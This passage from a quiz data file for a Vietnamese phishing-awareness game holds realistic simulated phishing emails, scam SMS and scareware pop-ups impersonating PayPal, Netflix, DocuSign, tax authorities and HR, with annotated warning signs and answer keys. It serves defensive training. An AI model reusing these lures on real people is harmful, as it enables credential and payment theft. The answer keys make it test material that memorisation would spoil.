        <div class="mail-row" data-spot="danger" data-label="Domain nhan-su-portal.com không thuộc hệ thống nhân sự VPS"><strong>From:</strong> luong@nhan-su-portal.com</div>
        <div class="mail-row"><strong>Subject:</strong> Cập nhật thông tin tài khoản nhận lương trước 25/12</div>
        <p>Hệ thống thanh toán lương sẽ nâng cấp từ tháng 01/2025.</p>
        <p data-spot="danger" data-label="Yêu cầu cung cấp CCCD và tài khoản ngân hàng qua link ngoài là rủi ro lộ dữ liệu cá nhân">Vui lòng cập nhật số CCCD và tài khoản ngân hàng trước ngày 25/12.</p>
        <p><a href="https://nhan-su-portal.com/payroll/update" title="https://nhan-su-portal.com/payroll/update" data-spot="danger" data-label="Link cập nhật lương nằm ngoài domain nội bộ được xác thực">Cập nhật ngay</a></p>
        <p data-spot="danger" data-label="Đe dọa trì hoãn lương tạo áp lực để người nhận bỏ qua bước xác minh">Nếu không cập nhật, lương tháng 01 có thể bị trì hoãn.</p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là phishing giả mạo HR. Dấu hiệu là domain ngoài, yêu cầu thông tin nhạy cảm và dùng áp lực lương để thúc ép thao tác nhanh.",
    indicators: [
      "Domain HR giả",
      "Yêu cầu CCCD/tài khoản ngân hàng",
      "Đe dọa trì hoãn lương",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 41,
  },
  {
    id: "q42",
    title: "Yêu cầu ký tài liệu qua DocuSign",
    category: "Email",
    scenarioIntro: "Bạn nhận được email yêu cầu ký phụ lục hợp đồng lao động qua DocuSign.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="DocuSign hợp lệ thường dùng docusign.com hoặc docusign.net, không phải docusign-secure-document.com"><strong>From:</strong> dse@docusign-secure-document.com</div>
        <div class="mail-row"><strong>Subject:</strong> Please DocuSign: Employment_Contract_Amendment_2025.pdf</div>
        <p><strong>HR Department</strong> sent you a document to review and sign.</p>
        <div class="attachment-card" data-spot="danger" data-label="Tài liệu nhân sự bất ngờ nên được xác minh lại trực tiếp với HR trước khi mở">
          <span class="file-icon">PDF</span>
          <div><strong>Employment_Contract_Amendment_2025.pdf</strong><p>Deadline: December 31, 2024</p></div>
        </div>
        <p><a href="https://docusign-secure-document.com/review" title="https://docusign-secure-document.com/review" data-spot="danger" data-label="Nút Review Document dẫn tới domain giả có thể đánh cắp tài khoản Microsoft hoặc Google">REVIEW DOCUMENT</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là phishing giả mạo DocuSign. Domain người gửi không phải domain chính thức và nút xem tài liệu có thể dẫn tới trang đăng nhập giả.",
    indicators: [
      "Domain DocuSign giả",
      "Tài liệu bất ngờ",
      "Nút review dẫn tới login giả",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 42,
  },
  {
    id: "q43",
    title: "Cảnh báo bảo mật từ GitHub",
    category: "Email",
    scenarioIntro: "Bạn nhận được email GitHub thông báo lỗ hổng trong repository.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `<div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi sử dụng domain chính thức github.com"><strong>From:</strong> GitHub &lt;noreply@github.com&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> [GitHub] A security vulnerability has been found in your repository</div>
        <p>We found a potential security vulnerability in one of your dependencies.</p>
        <p data-spot="safe" data-label="Email nêu repository, package và CVE cụ thể để người dùng tự kiểm tra trong GitHub">Repository: <strong>your-org/internal-api</strong>. Package: <strong>lodash 4.17.15</strong>. Severity: <strong>High</strong>.</p>
        <p data-spot="safe" data-label="Hướng dẫn truy cập trực tiếp github.com thay vì ép bấm link đăng nhập trong email">To view and fix this alert, visit your repository's Security tab directly at <strong>github.com</strong>.</p>
      </div>`,
    correctAnswer: "legitimate",
    explanation: "Đây là email hợp lệ. Người gửi thuộc github.com, nội dung có thông tin kỹ thuật cụ thể và không ép bấm link đăng nhập.",
    indicators: [
      "Domain chính thức",
      "Thông tin CVE cụ thể",
      "Không ép đăng nhập qua link",
    ],
    active: false,
    alwaysIncluded: true,
    orderIndex: 43,
  },
  {
    id: "q44",
    title: "Thông báo truy thu thuế thu nhập cá nhân",
    category: "Email",
    scenarioIntro: "Bạn nhận được email thông báo truy thu thuế thu nhập cá nhân.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Cơ quan nhà nước Việt Nam thường dùng domain .gov.vn, không phải tong-cuc-thue-gov.com"><strong>From:</strong> thongbao@tong-cuc-thue-gov.com</div>
        <div class="mail-row"><strong>Subject:</strong> THÔNG BÁO TRUY THU THUẾ - Cần xử lý trong 7 ngày làm việc</div>
        <p>Qua rà soát kỳ tính thuế 2022-2024, hệ thống phát hiện số thuế TNCN còn thiếu.</p>
        <p data-spot="danger" data-label="Số tiền lớn và thời hạn ngắn tạo áp lực tâm lý để người nhận bấm link">Số tiền truy thu: <strong>42.800.000 VNĐ</strong>. Thời hạn: <strong>7 ngày làm việc</strong>.</p>
        <p><a href="https://tong-cuc-thue-gov.com/payment" title="https://tong-cuc-thue-gov.com/payment" data-spot="danger" data-label="Link nộp thuế không thuộc cổng thuedientu.gdt.gov.vn chính thức">Nộp thuế ngay</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là phishing giả mạo cơ quan thuế. Domain không phải .gov.vn, nội dung gây áp lực bằng số tiền lớn và link nộp thuế không chính thức.",
    indicators: [
      "Domain cơ quan nhà nước giả",
      "Tạo áp lực bằng số tiền lớn",
      "Link nộp thuế không chính thức",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 44,
  },
  {
    id: "q45",
    title: "Báo cáo Q4 dạng file Excel",
    category: "Email",
    scenarioIntro: "Bạn nhận được email gửi báo cáo thị trường Q4 dạng Excel có macro.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Domain business-reports-online.com là nguồn ngoài không quen thuộc"><strong>From:</strong> analytics@business-reports-online.com</div>
        <div class="mail-row"><strong>Subject:</strong> Q4 2024 Market Intelligence Report - Action Required</div>
        <p>Please find attached the Q4 2024 Market Intelligence Report prepared for your department.</p>
        <div class="attachment-card" data-spot="danger" data-label="File .xlsm là Excel có macro, có thể thực thi mã khi người dùng bật nội dung">
          <span class="file-icon file-icon-danger">XLSM</span>
          <div><strong>Q4_Market_Report_2024.xlsm</strong><p>Excel Macro-Enabled Workbook - 3.1 MB</p></div>
        </div>
        <p data-spot="danger" data-label="Yêu cầu Enable Content là dấu hiệu nguy hiểm vì macro thường bị lợi dụng để chạy mã độc">When Excel shows a yellow security bar, click <strong>Enable Content</strong> to load charts.</p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là phishing phát tán mã độc qua macro. File .xlsm từ nguồn lạ và hướng dẫn bật Enable Content là dấu hiệu rủi ro cao.",
    indicators: [
      "File .xlsm có macro",
      "Nguồn gửi lạ",
      "Yêu cầu Enable Content",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 45,
  },
  {
    id: "q46",
    title: "Thông báo tin nhắn Microsoft Teams chưa đọc",
    category: "Email",
    scenarioIntro: "Bạn nhận email thông báo có nhiều tin nhắn Microsoft Teams chưa đọc.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Email Teams thật thường đến từ domain Microsoft, không phải ms-teams-alerts.com"><strong>From:</strong> notify@ms-teams-alerts.com</div>
        <div class="mail-row"><strong>Subject:</strong> You have 3 missed messages in Microsoft Teams</div>
        <p>You have <strong>3 unread messages</strong> waiting for you.</p>
        <p data-spot="danger" data-label="Tin nhắn giả từ IT Support về khóa tài khoản là chiến thuật tạo khẩn cấp">IT Support: "Your account will be suspended. Verify now."</p>
        <p><a href="https://ms-teams-alerts.com/messages" title="https://ms-teams-alerts.com/messages" data-spot="danger" data-label="Nút mở Teams dẫn tới domain giả, không phải teams.microsoft.com">Open Teams Messages</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là phishing giả mạo Microsoft Teams. Domain gửi và link mở Teams đều giả, nội dung khóa tài khoản tạo áp lực để đánh cắp thông tin đăng nhập.",
    indicators: [
      "Domain Teams giả",
      "Tạo khẩn cấp bằng khóa tài khoản",
      "Link không phải teams.microsoft.com",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 46,
  },
  {
    id: "q47",
    title: "Lời mời đầu tư crypto qua tin nhắn",
    category: "SMS",
    scenarioIntro: "Một người lạ nhắn tin làm quen và mời đầu tư crypto lợi nhuận rất cao.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="sms-sim">
        <div data-spot="danger" data-label="Người gửi lạ tiếp cận bằng câu chuyện nhắn nhầm để tạo quan hệ giả">Linh Nguyễn - WhatsApp</div>
        <p>Chào anh/chị! Em là Linh, chuyên viên tài chính tại Hà Nội. Em vô tình nhắn nhầm nhưng thấy profile của anh/chị rất chuyên nghiệp.</p>
        <p data-spot="danger" data-label="Lời hứa lợi nhuận 15-30%/tuần là phi thực tế và thường dùng trong lừa đảo đầu tư">Em đang dùng nền tảng CryptoGold Pro, lợi nhuận 15-30%/tuần.</p>
        <p>Đây là link đăng ký: <a href="https://cryptogold-pro.vip/register" title="https://cryptogold-pro.vip/register" data-spot="danger" data-label="Domain .vip và nền tảng đầu tư không xác minh là dấu hiệu rủi ro cao">cryptogold-pro.vip/register</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là lừa đảo đầu tư kiểu pig butchering. Người lạ tạo quan hệ, hứa lợi nhuận phi thực tế và dẫn tới nền tảng không xác minh.",
    indicators: [
      "Người lạ nhắn nhầm",
      "Lợi nhuận phi thực tế",
      "Nền tảng đầu tư không xác minh",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 47,
  },
  {
    id: "q48",
    title: "Popup thông báo gói Norton hết hạn",
    category: "Website",
    scenarioIntro: "Một website hiển thị thông báo gói Norton đã hết hạn và máy có nhiều mã độc.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="danger" data-label="Popup xuất hiện trong trình duyệt từ domain lạ, không phải ứng dụng Norton cài trên máy"><span>https://norton-renewal-warning.com/scan</span></div>
          </div>
          <div class="browser-page">
            <div class="captcha-verify">
              <h4>NORTON - Cảnh báo bảo mật khẩn cấp</h4>
              <p>Gói bảo vệ Norton của bạn đã <strong data-spot="danger" data-label="Thông báo hết hạn được dùng để thúc ép thanh toán ngay">HẾT HẠN</strong>.</p>
              <p data-spot="danger" data-label="Danh sách virus cụ thể trong popup web thường là bịa đặt để gây hoảng loạn">Trojans phát hiện: 3. Spyware phát hiện: 7. Adware phát hiện: 12.</p>
              <button type="button" data-spot="danger" data-label="Nút gia hạn có thể dẫn tới trang thanh toán giả để đánh cắp thẻ">Gia hạn ngay - 299.000đ/năm</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là scareware giả mạo Norton. Popup web tạo hoảng loạn bằng danh sách virus giả và dẫn người dùng tới thanh toán giả.",
    indicators: [
      "Popup web giả Norton",
      "Danh sách virus gây hoảng loạn",
      "Yêu cầu thanh toán ngay",
    ],
    active: false,
    alwaysIncluded: false,
    orderIndex: 48,
  },
  {
    id: "q49",
    title: "Lời mời tuyển dụng trong lĩnh vực tài chính",
    category: "Email",
    scenarioIntro: "Bạn nhận được lời mời tuyển dụng với mức lương rất cao và file mô tả công việc.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Domain financialcareers-apac.com chưa được xác minh là đơn vị tuyển dụng uy tín"><strong>From:</strong> recruitment@financialcareers-apac.com</div>
        <div class="mail-row"><strong>Subject:</strong> Exclusive Opportunity: Senior Financial Analyst - DBS Bank Singapore</div>
        <p>Compensation: <strong data-spot="danger" data-label="Mức lương rất cao so với bối cảnh có thể là mồi nhử cho mục tiêu tài chính">SGD 12,000-15,000/month</strong> + relocation package.</p>
        <div class="attachment-card" data-spot="danger" data-label="File đính kèm từ lời mời chưa xác minh có thể chứa mã độc hoặc khai thác lỗ hổng trình đọc PDF">
          <span class="file-icon file-icon-danger">PDF</span>
          <div><strong>JobDescription_SeniorAnalyst_DBS.pdf</strong><p>Please open to confirm interest</p></div>
        </div>
        <p data-spot="danger" data-label="Thời hạn 48 giờ tạo áp lực để người nhận mở file trước khi kiểm chứng">Please respond within 48 hours to be considered.</p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là spear phishing dùng lời mời tuyển dụng hấp dẫn. Domain chưa xác minh, mức lương bất thường, thời hạn gấp và file đính kèm đều là dấu hiệu rủi ro.",
    indicators: [
      "Domain tuyển dụng chưa xác minh",
      "Mức lương quá hấp dẫn",
      "File đính kèm bất ngờ",
    ],
    active: false,
    alwaysIncluded: false,
    orderIndex: 49,
  },
  {
    id: "4bfa1358-cedf-4a98-95fb-fe5f9e32db5e",
    title: "Paypal",
    category: "Email",
    scenarioIntro: "Bạn nhận được email báo tài khoản PayPal bị giới hạn và phải xử lý trong 24 giờ.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `<div class="email-phishing-sim">
  <div class="email-window">

    <!-- Email header -->
    <div class="email-topbar">
      <div class="email-subject">
        [PayPal]: Your account access has been limited
      </div>

      <div class="email-toolbar">
        <span>▣</span>
        <span>↗</span>
      </div>

      <div class="email-tag">Inbox ×</div>
    </div>

    <!-- Sender -->
    <div class="sender-section">

      <div class="sender-avatar">T</div>

      <div class="sender-info">
        <div>
          <strong>Team Support</strong>
          <span
            class="phishing-spot"
            data-step="1"
            data-spot="danger"
            data-label="Địa chỉ người gửi sử dụng domain paypal-accounts.com, không phải domain chính thức của PayPal.">
            &lt;services@paypal-accounts.com&gt;
          </span>
        </div>

        <div class="sender-to">
          to me ▾
        </div>
      </div>

      <div class="sender-actions">
        <span>☆</span>
        <span>↩</span>
        <span>⋮</span>
      </div>

    </div>

    <div class="email-divider"></div>

    <!-- Email body -->
    <div class="email-body">

      <div class="paypal-logo">
        <span class="logo-p">P</span>
        <span class="logo-text">
          <span>Pay</span><span>Pal</span>
        </span>
      </div>

      <p>Dear PayPal customer,</p>

      <!-- Dấu hiệu 2 -->
      <div
        class="phishing-spot"
        data-step="2"
        data-spot="danger"
        data-label="Thông báo tài khoản bị giới hạn và đe dọa vô hiệu hóa vĩnh viễn nhằm tạo tâm lý lo sợ.">
        <p>
          Your PayPal account is limited, You have
          <strong>24 hours</strong>
          to solve the problem or your account will be permanently disabled.
        </p>
      </div>

      <p>
        We are sorry to inform you that you no longer have access to
        PayPal‘s advantages like purchasing, and sending and receiving
        money.
      </p>

      <p>
        <strong>Why is my PayPal account limited?</strong><br>

        <!-- Dấu hiệu 3 -->
        <span
          class="phishing-spot"
          data-step="3"
          data-spot="danger"
          data-label="Nội dung viện dẫn nguy cơ tài khoản bị người dùng trái phép nhằm làm tăng cảm giác cấp bách.">
          We believe that your account is in danger from unauthorized users.
        </span>
      </p>

      <p>
        <strong>What can I do to resolve the problem?</strong><br>

        <!-- Dấu hiệu 4 -->
        <span
          class="phishing-spot"
          data-step="4"
          data-spot="danger"
          data-label="Yêu cầu người dùng xác nhận toàn bộ thông tin tài khoản thông qua một liên kết là dấu hiệu phishing.">
          You have to confirm all of your account details on our secured
          server by clicking the link below and following the steps.
        </span>
      </p>

      <!-- Dấu hiệu 5 -->
      <div
        class="phishing-spot"
        data-step="5"
        data-spot="danger"
        data-label="Nút yêu cầu xác nhận thông tin tài khoản có thể dẫn người dùng tới trang web giả mạo để thu thập thông tin.">

        <a
          href="#"
          onclick="return false;"
          class="confirm-button">
          Confirm Your Information
        </a>

      </div>

    </div>

  </div>
</div>


<style>
.email-phishing-sim {
  width: 100%;
  max-width: 1000px;
  margin: 0 auto;
  background: #000;
  padding: 44px;
  box-sizing: border-box;
  font-family: Arial, Helvetica, sans-serif;
}

.email-window {
  background: #fff;
  min-height: 900px;
  color: #111;
  box-sizing: border-box;
}

/* =========================
   EMAIL HEADER
   ========================= */

.email-topbar {
  position: relative;
  padding: 48px 44px 24px;
}

.email-subject {
  font-size: 25px;
  font-weight: 400;
  color: #222;
}

.email-toolbar {
  position: absolute;
  right: 45px;
  top: 50px;
  display: flex;
  gap: 25px;
  font-size: 22px;
}

.email-tag {
  display: inline-block;
  margin-top: 12px;
  padding: 3px 8px;
  border-radius: 4px;
  background: #e5e5e5;
  color: #555;
  font-size: 12px;
}

/* =========================
   SENDER
   ========================= */

.sender-section {
  display: flex;
  align-items: center;
  padding: 8px 44px 22px;
}

.sender-avatar {
  width: 42px;
  height: 42px;
  border-radius: 50%;
  background: #4285e8;
  color: white;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 22px;
  margin-right: 16px;
}

.sender-info {
  flex: 1;
  font-size: 16px;
}

.sender-info strong {
  font-size: 17px;
}

.sender-to {
  font-size: 12px;
  color: #555;
  margin-top: 4px;
}

.sender-actions {
  display: flex;
  gap: 24px;
  font-size: 22px;
  color: #333;
}

.email-divider {
  height: 1px;
  background: #d8d8d8;
  margin: 0 44px;
}

/* =========================
   EMAIL BODY
   ========================= */

.email-body {
  width: 690px;
  max-width: calc(100% - 80px);
  margin: 0 auto;
  padding: 32px 0 120px;
  font-size: 18px;
  line-height: 1.35;
}

.paypal-logo {
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 35px;
}

.logo-p {
  font-size: 92px;
  line-height: 70px;
  font-weight: bold;
  font-style: italic;
  color: #173f91;
  margin-right: 10px;
}

.logo-text {
  font-size: 48px;
  font-weight: bold;
  font-style: italic;
  color: #173f91;
}

.logo-text span:last-child {
  color: #16a1dc;
}

.email-body p {
  margin: 0 0 22px;
}

/* =========================
   PHISHING HIGHLIGHT
   ========================= */

.phishing-spot {
  position: relative;
  cursor: pointer;
  border: 2px solid transparent;
  border-radius: 5px;
  padding: 2px 4px;
  transition: border-color 0.15s ease,
              background 0.15s ease;
}

.phishing-spot.danger-highlight {
  border-color: #e53935;
  background: rgba(229, 57, 53, 0.06);
}

/* =========================
   BUTTON
   ========================= */

.confirm-button {
  display: inline-block;
  padding: 12px 45px;
  background: #159bd3;
  color: #fff;
  text-decoration: none;
  border-radius: 5px;
  font-size: 16px;
}

.confirm-button:hover {
  background: #159bd3;
}
</style>


<script>
(function () {

  const spots = Array.from(
    document.querySelectorAll('.phishing-spot[data-step]')
  ).sort(function (a, b) {
    return Number(a.dataset.step) - Number(b.dataset.step);
  });

  let currentStep = 1;

  spots.forEach(function (spot) {

    spot.addEventListener('click', function (event) {

      event.preventDefault();

      const step = Number(this.dataset.step);

      /*
       * Chỉ cho phép click dấu hiệu
       * đang được yêu cầu.
       */
      if (step !== currentStep) {
        return;
      }

      /*
       * Xóa toàn bộ highlight trước đó.
       * Vì vậy không bao giờ có nhiều
       * khung đỏ cùng lúc.
       */
      spots.forEach(function (item) {
        item.classList.remove('danger-highlight');
      });

      /*
       * Highlight đúng dấu hiệu hiện tại.
       */
      this.classList.add('danger-highlight');

      /*
       * Hiển thị label bằng cơ chế
       * data-label hiện có của hệ thống.
       */
      this.setAttribute('data-found', 'true');

      /*
       * Chuyển sang dấu hiệu tiếp theo.
       */
      currentStep++;

    });

  });

})();
</script>`,
    correctAnswer: "phishing",
    explanation: "Email gửi từ domain paypal-accounts.com chứ không phải tên miền chính thức của PayPal, dọa khóa vĩnh viễn tài khoản trong 24 giờ và yêu cầu xác nhận toàn bộ thông tin tài khoản qua một liên kết - đây là mô típ phishing điển hình.",
    indicators: [
      "Tên miền người gửi không phải của PayPal",
      "Dọa khóa tài khoản trong 24 giờ để ép hành động",
      "Yêu cầu xác nhận toàn bộ thông tin tài khoản qua liên kết",
    ],
    active: true,
    alwaysIncluded: true,
    orderIndex: 50,
  },
  {
    id: "ec4cbde6-3e74-4255-ae71-a7cc8921dfe0",
    title: "Netflix",
    category: "Email",
    scenarioIntro: "Bạn nhận được email báo tài khoản Netflix đang bị tạm giữ và cần đặt lại mật khẩu.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `<div class="email-phishing-sim">
  <div class="email-window">

    <!-- ================= HEADER ================= -->

    <div class="email-header">

      <div class="email-subject-row">
        <div class="email-subject">
          Netflix Membership on hold
        </div>

        <span class="inbox-tag">
          Inbox ×
        </span>

        <div class="email-tools">
          <span>♧</span>
          <span>↗</span>
        </div>
      </div>

      <!-- ================= SENDER ================= -->

      <div class="sender-row">

        <div class="sender-avatar">
          <div class="avatar-head"></div>
          <div class="avatar-body"></div>
        </div>

        <div class="sender-info">

          <div class="sender-name-row">

            <strong>NETFLIX</strong>

            <!-- DẤU HIỆU 1 -->
            <span
              class="phishing-spot sender-email"
              data-step="1"
              data-spot="danger"
              data-label="Địa chỉ người gửi sử dụng domain mailer.netflix.com, cần kiểm tra kỹ vì tên miền người gửi có thể được giả mạo.">
              &lt;info@mailer.netflix.com&gt;
            </span>

          </div>

          <div class="sender-to">
            to me ▾
          </div>

        </div>

        <div class="sender-actions">
          <span>☆</span>
          <span>↩</span>
          <span>⋮</span>
        </div>

      </div>

      <div class="header-divider"></div>

    </div>


    <!-- ================= EMAIL CONTENT AREA ================= -->

    <div class="email-background">

      <div class="email-card">

        <!-- ================= NETFLIX LOGO ================= -->

        <div class="netflix-logo">
          NETFLIX
        </div>


        <!-- ================= EMAIL CONTENT ================= -->

        <h1>
          Reset your password
        </h1>

        <p>
          Hi {fname},
        </p>

        <!-- DẤU HIỆU 2 -->
        <div class="phishing-spot-plain">

          <p>
            Let's reset your password so you can get back to watching.
          </p>

        </div>


        <!-- DẤU HIỆU 3 -->
        <div
          class="phishing-spot button-spot"
          data-step="3"
          data-spot="danger"
          data-label="Nút Reset Password là lời kêu gọi hành động trực tiếp, có thể dẫn người dùng tới trang giả mạo để thu thập thông tin đăng nhập.">

          <a
            href="#"
            onclick="return false;"
            class="reset-button">
            RESET PASSWORD
          </a>

        </div>


        <!-- ================= WARNING TEXT ================= -->

        <!-- DẤU HIỆU 4 -->
        <div class="warning-spot">

          <p>
            If you did not ask to reset your password,
            <a href="#" onclick="return false;" data-step="4" data-spot="danger" data-label="Đường link thay thế 'click here' tiếp tục yêu cầu đăng nhập và đặt lại mật khẩu - cần kiểm tra trước khi truy cập.">click here</a>
            to login and reset your password

            <!-- DẤU HIỆU 5 -->
            <strong
              class="phishing-spot inline-spot"
              data-step="5"
              data-spot="danger"
              data-label="Từ 'immediately' tạo áp lực thời gian, khiến người dùng dễ hành động vội vàng mà không kiểm tra email và đường link.">
              immediately
            </strong>

            to avoid unauthorized activity on your account.
          </p>

        </div>

      </div>

    </div>

  </div>
</div>


<style>

/* =====================================================
   OUTER EMAIL SIMULATION
   ===================================================== */

.email-phishing-sim {
  width: 100%;
  max-width: 1100px;
  margin: 0 auto;
  background: #000;
  padding: 44px;
  box-sizing: border-box;

  font-family:
    Arial,
    Helvetica,
    sans-serif;
}

.email-window {
  background: #fff;
  min-height: 900px;
  color: #111;
}


/* =====================================================
   EMAIL HEADER
   ===================================================== */

.email-header {
  background: #fff;
  padding: 50px 45px 0;
}

.email-subject-row {
  display: flex;
  align-items: center;
  position: relative;
}

.email-subject {
  font-size: 25px;
  font-weight: 400;
  line-height: 1.2;
}

.inbox-tag {
  margin-left: 12px;
  background: #e6e6e6;
  color: #555;
  border-radius: 4px;
  padding: 3px 7px;
  font-size: 12px;
}

.email-tools {
  position: absolute;
  right: 0;
  display: flex;
  gap: 25px;
  font-size: 21px;
  color: #333;
}


/* =====================================================
   SENDER
   ===================================================== */

.sender-row {
  display: flex;
  align-items: center;
  margin-top: 34px;
  padding-bottom: 20px;
}

.sender-avatar {
  width: 44px;
  height: 44px;
  border-radius: 50%;
  background: #8ab4f8;
  position: relative;
  overflow: hidden;
  margin-right: 16px;
}

.avatar-head {
  width: 14px;
  height: 14px;
  border-radius: 50%;
  background: #3975d3;
  position: absolute;
  top: 9px;
  left: 15px;
}

.avatar-body {
  width: 29px;
  height: 16px;
  border-radius: 18px 18px 0 0;
  background: #3975d3;
  position: absolute;
  bottom: 5px;
  left: 8px;
}

.sender-info {
  flex: 1;
}

.sender-name-row {
  display: flex;
  align-items: baseline;
  gap: 7px;
  font-size: 16px;
}

.sender-name-row strong {
  font-size: 17px;
}

.sender-email {
  color: #555;
}

.sender-to {
  margin-top: 4px;
  color: #555;
  font-size: 12px;
}

.sender-actions {
  display: flex;
  gap: 23px;
  color: #333;
  font-size: 22px;
}

.header-divider {
  height: 1px;
  background: #d8d8d8;
}


/* =====================================================
   EMAIL BACKGROUND
   ===================================================== */

.email-background {
  background: #f5f5f5;
  min-height: 730px;
  padding: 18px 0 100px;
}


/* =====================================================
   EMAIL CARD
   ===================================================== */

.email-card {
  width: 720px;
  max-width: calc(100% - 60px);
  margin: 0 auto;

  background: #fff;
  border: 2px solid #e2e2e2;

  padding: 28px 98px 34px;
  box-sizing: border-box;

  font-size: 20px;
  line-height: 1.35;
}

.email-card h1 {
  font-size: 40px;
  line-height: 1.15;
  margin: 0 0 38px;
  font-weight: 700;
}

.email-card p {
  margin: 0 0 28px;
}


/* =====================================================
   NETFLIX LOGO
   ===================================================== */

.netflix-logo {
  text-align: center;

  font-family:
    Impact,
    "Arial Narrow",
    Arial,
    sans-serif;

  font-size: 55px;
  font-weight: 900;
  letter-spacing: -2px;

  color: #e50914;

  transform: scaleX(0.9);

  margin: 0 auto 48px;

  line-height: 1;
}


/* =====================================================
   PHISHING CLICK SPOTS
   ===================================================== */

.phishing-spot {
  cursor: pointer;

  border: 2px solid transparent;
  border-radius: 5px;

  padding: 2px 4px;

  transition:
    border-color 0.15s ease,
    background 0.15s ease;
}


/*
   Chỉ phần tử đang được phát hiện
   mới có khung đỏ.
*/

.phishing-spot.danger-highlight {
  border-color: #e53935;
  background: rgba(229, 57, 53, 0.06);
}


/* =====================================================
   RESET BUTTON
   ===================================================== */

.button-spot {
  display: inline-block;
  margin-bottom: 24px;
}

.reset-button {
  display: inline-block;

  background: #e50914;
  color: #fff;

  text-decoration: none;

  padding: 13px 22px;

  border-radius: 3px;

  font-size: 18px;
  font-weight: 600;

  white-space: nowrap;
}


/* =====================================================
   WARNING AREA
   ===================================================== */

.warning-spot {
  display: block;
}

.warning-spot a {
  color: #0000ee;
  text-decoration: underline;
}

.inline-spot {
  display: inline;
  padding: 1px 3px;
}


/* =====================================================
   RESPONSIVE
   ===================================================== */

@media (max-width: 800px) {

  .email-phishing-sim {
    padding: 15px;
  }

  .email-header {
    padding: 30px 25px 0;
  }

  .email-card {
    padding: 28px 35px;
  }

  .email-card h1 {
    font-size: 32px;
  }

  .email-card {
    font-size: 18px;
  }

  .email-tools {
    display: none;
  }

}

</style>


<script>
(function () {

  /*
   * Lấy tất cả các dấu hiệu phishing
   * và sắp xếp theo data-step.
   */
  const spots = Array.from(
    document.querySelectorAll(
      '.phishing-spot[data-step]'
    )
  ).sort(function (a, b) {
    return Number(a.dataset.step) -
           Number(b.dataset.step);
  });


  /*
   * Bắt đầu từ dấu hiệu số 1.
   */
  let currentStep = 1;


  spots.forEach(function (spot) {

    spot.addEventListener('click', function (event) {

      event.preventDefault();

      const step =
        Number(this.dataset.step);


      /*
       * Không cho phép click
       * vượt qua thứ tự.
       */
      if (step !== currentStep) {
        return;
      }


      /*
       * Xóa toàn bộ khung đỏ
       * trước khi highlight dấu hiệu mới.
       */
      spots.forEach(function (item) {
        item.classList.remove(
          'danger-highlight'
        );
      });


      /*
       * Chỉ hiện khung đỏ
       * cho dấu hiệu vừa click.
       */
      this.classList.add(
        'danger-highlight'
      );


      /*
       * Giữ lại trạng thái đã tìm thấy
       * để hệ thống game có thể xử lý.
       */
      this.setAttribute(
        'data-found',
        'true'
      );


      /*
       * Chuyển sang dấu hiệu tiếp theo.
       */
      currentStep++;

    });

  });

})();
</script>`,
    correctAnswer: "phishing",
    explanation: "Email dùng thương hiệu Netflix nhưng thúc người nhận đặt lại mật khẩu ngay dù bạn không hề yêu cầu, kèm nút và liên kết dẫn tới trang đăng nhập bên ngoài. Từ \"immediately\" tạo áp lực thời gian để bạn bấm trước khi kịp kiểm tra.",
    indicators: [
      "Yêu cầu đặt lại mật khẩu dù bạn không hề yêu cầu",
      "Nút và liên kết dẫn tới trang đăng nhập bên ngoài",
      "Tạo áp lực thời gian để bạn hành động vội",
    ],
    active: true,
    alwaysIncluded: true,
    orderIndex: 51,
  },
  {
    id: "qr-safe-canteen-menu",
    title: "Mã QR thực đơn căng tin",
    category: "QR",
    scenarioIntro: "Trên bàn ăn căng tin công ty có đặt standee kèm mã QR xem thực đơn tuần.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra vps.com.vn/canteen/thuc-don-tuan - đúng tên miền công ty, chỉ xem thông tin" class="qr-image" src="/assets/qr/qr-04.png" alt="Mã QR trong tình huống" width="180" height="180" />
